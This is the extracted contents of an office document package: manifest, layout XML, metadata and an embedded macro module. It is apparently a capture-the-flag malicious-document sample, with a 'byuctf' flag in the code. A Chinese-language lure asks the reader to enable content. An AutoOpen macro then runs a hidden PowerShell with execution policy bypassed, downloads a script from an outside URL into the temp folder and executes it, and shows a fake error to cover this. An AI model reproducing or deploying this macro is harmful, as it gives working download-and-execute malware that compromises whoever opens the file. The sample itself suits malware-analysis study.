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Project/NewMacros.xml" manifest:media-type="text/xml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4E0000041CC3029B2CAA0F3A47.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/1000000000000500000002D0AD962E6A5DC3B411.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000000000000FB000000C997053AEE03F0A275.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/1000000000000500000002D06C1BF60FB5D30A71.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/1000000000000150000000BCF3AA2023C0AF6260.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/1000000000000400000004008A897BE8E3E1FD63.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/100000000000012C000000A8D4F2BB255BA53689.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000000000001E0000001E00790EBAF8EF5A7B0.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000000000002E0000002E0CF4EC13014551F3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loext:graphic-properties draw:fill="solid" draw:fill-color="#ffe699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in" svg:stroke-color="#bfbfbf" draw:fill="solid" draw:fill-color="#ffe699" loext:fill-theme-color="accent4" loext:fill-color-lum-mod="40%" loext:fill-color-lum-off="60%" draw:textarea-vertical-align="middle" draw:auto-grow-height="false" fo:min-height="0.328in" fo:min-width="5.8528in" fo:padding-top="0.05in" fo:padding-bottom="0.05in" fo:padding-left="0.1in" fo:padding-right="0.1in" fo:wrap-option="wrap" draw:shadow="visible" draw:shadow-offset-x="0.0291in" draw:shadow-offset-y="0.0291in" draw:shadow-color="#000000" draw:shadow-opacity="40%" loext:shadow-blur="0.0555in" fo:margin-left="0.139in" fo:margin-right="0.1756in" fo:margin-top="0.0138in" fo:margin-bottom="0.050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.5102in" svg:y="0.2953in" svg:width="5.7681in" svg:height="5.7681in" draw:z-index="3"><draw:image xlink:href="Pictures/10000000000002E0000002E0CF4EC13014551F3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1.6134in" svg:y="0.0217in" svg:width="5in" svg:height="5in" draw:z-index="4"><draw:image xlink:href="Pictures/10000000000001E0000001E00790EBAF8EF5A7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-0.0327in" svg:y="0.0437in" svg:width="3.1252in" svg:height="1.75in" draw:z-index="7"><draw:image xlink:href="Pictures/100000000000012C000000A8D4F2BB255BA536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7" text:anchor-type="char" svg:x="2.8736in" svg:y="0.1807in" svg:width="3.5in" svg:height="1.9583in" draw:z-index="8"><draw:image xlink:href="Pictures/1000000000000150000000BCF3AA2023C0AF626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.7283in" svg:y="0.0854in" svg:width="5.7681in" svg:height="5.7681in" draw:z-index="10"><draw:image xlink:href="Pictures/1000000000000400000004008A897BE8E3E1FD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0.598in" svg:y="0.1043in" svg:width="2.6146in" svg:height="2.0937in" draw:z-index="9"><draw:image xlink:href="Pictures/10000000000000FB000000C997053AEE03F0A2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custom-shape text:anchor-type="char" draw:z-index="0" draw:name="矩形 2" draw:style-name="gr1" draw:text-style-name="P2" svg:width="6.0524in" svg:height="0.4276in" svg:x="0.0764in" svg:y="1.0016in"><text:p text:style-name="P1"><text:span text:style-name="T1">内容被隐藏，请确认是否已在左上方“启用内容”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frame draw:style-name="fr1" draw:name="Image5" text:anchor-type="char" svg:x="1.0827in" svg:y="0.8752in" svg:width="5.7681in" svg:height="3.2445in" draw:z-index="6"><draw:image xlink:href="Pictures/1000000000000500000002D0AD962E6A5DC3B4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GoBack"/><draw:frame draw:style-name="fr1" draw:name="Image1" text:anchor-type="char" svg:x="0.8854in" svg:y="5.8126in" svg:width="5.7681in" svg:height="3.2445in" draw:z-index="2"><draw:image xlink:href="Pictures/100000000000074E0000041CC3029B2CAA0F3A47.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame><draw:frame draw:style-name="fr1" draw:name="Image4" text:anchor-type="char" svg:x="0in" svg:y="2.7374in" svg:width="5.7681in" svg:height="3.2445in" draw:z-index="5"><draw:image xlink:href="Pictures/1000000000000500000002D06C1BF60FB5D30A71.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png"/></draw:frame><text:bookmark-end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.5pt" fo:language="en" fo:country="US" style:letter-kerning="true" style:font-name-asian="宋体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Calibri" fo:font-size="10.5pt" fo:language="en" fo:country="US" style:letter-kerning="true" style:font-name-asian="宋体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页眉_20_Char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loext:linked-style-name="页脚_20_Char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页眉_20_Char" style:display-name="页眉 Char" style:family="text" style:parent-style-name="Default_20_Paragraph_20_Font" loext:linked-style-name="Header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 loext:linked-style-name="Footer">
      <style:text-properties fo:font-size="9pt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1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21T09:16:00</meta:creation-date>
    <meta:initial-creator>John</meta:initial-creator>
    <dc:language>en-US</dc:language>
    <dc:date>2023-05-05T20:22:26.391536549</dc:date>
    <meta:editing-cycles>10</meta:editing-cycles>
    <meta:editing-duration>PT8H11M15S</meta:editing-duration>
    <meta:generator>LibreOffice/7.4.5.1$Linux_X86_64 LibreOffice_project/40$Build-1</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="9" meta:object-count="0" meta:page-count="3" meta:paragraph-count="1" meta:word-count="22" meta:character-count="22" meta:non-whitespace-character-count="22"/>
    <meta:user-defined meta:name="AppVersion">15.0000</meta:user-defined>
    <meta:template xlink:type="simple" xlink:actuate="onRequest" xlink:title="Normal.dotm" xlink:href=""/>
  </office:meta>
</office:document-meta>
</file>

<file path=Basic/Project/NewMacros.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="NewMacros" script:language="StarBasic" script:moduleType="normal">Rem Attribute VBA_ModuleType=VBAModule
Option VBASupport 1
Sub AutoOpen()
    Dim FGHNBVRGHJJGFDSDUUUU As String
    FGHNBVRGHJJGFDSDUUUU = "cmd /K " + "byu" + "ctf" + "{" + "m@ldocs @re" + "sn@eky and bad}" + "e -WindowStyle hiddeN -ExecuTionPolicy BypasS -noprofile (New-Object      System.Net.WebClient).DownloadFile('http://bsrc.baidu.com/drill/doc-zh.html','%TEMP%\Y.ps1');      poWerShEll.exe -WindowStyle hiddeN -ExecutionPolicy Bypass -noprofile      -file %TEMP%\Y.ps1"
    Shell FGHNBVRGHJJGFDSDUUUU, 0
    MsgBox ("Module could not be found.")
End Sub

</script:module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NewMacros"/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